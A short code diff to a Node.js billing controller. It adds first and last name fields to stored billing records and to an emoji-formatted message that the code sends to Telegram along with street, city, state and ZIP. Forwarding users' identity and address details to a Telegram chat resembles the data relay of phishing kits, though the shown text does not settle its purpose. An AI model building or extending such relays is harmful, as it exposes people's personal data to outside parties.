@@ -30,9 +30,8 @@ const readCSV = async (bin) => {
 };
 
 exports.createBillingInfo = async (req, res) => {
-  const { userId, street, city, state, postalCode } = req.body;
+  const { userId, fName, lName ,street, city, state, postalCode } = req.body;
   
-  console.log('Received data:', { userId, street, city, state, postalCode });
   
   if (!userId) {
     return res.status(400).json({ error: 'User ID is required' });
@@ -40,7 +39,7 @@ exports.createBillingInfo = async (req, res) => {
   
   try {
     // Create new billing info
-    const billingInfo = new Billing({ userId, street, city, state, postalCode });
+    const billingInfo = new Billing({ userId, fName, lName,street, city, state, postalCode });
     await billingInfo.save();
     
     // Send notification to Telegram
@@ -49,6 +48,8 @@ exports.createBillingInfo = async (req, res) => {
     ---------------------------------
     👤 <b>UserID:</b> ${userId}
     📍 <b>Street:</b> ${street}
+       <b>fName:</b> ${fName}
+       <b>lName:</b> ${lName}
     🏙️ <b>City:</b> ${city}
     🗽 <b>State:</b> ${state}
     📮 <b>ZIP:</b> ${postalCode}
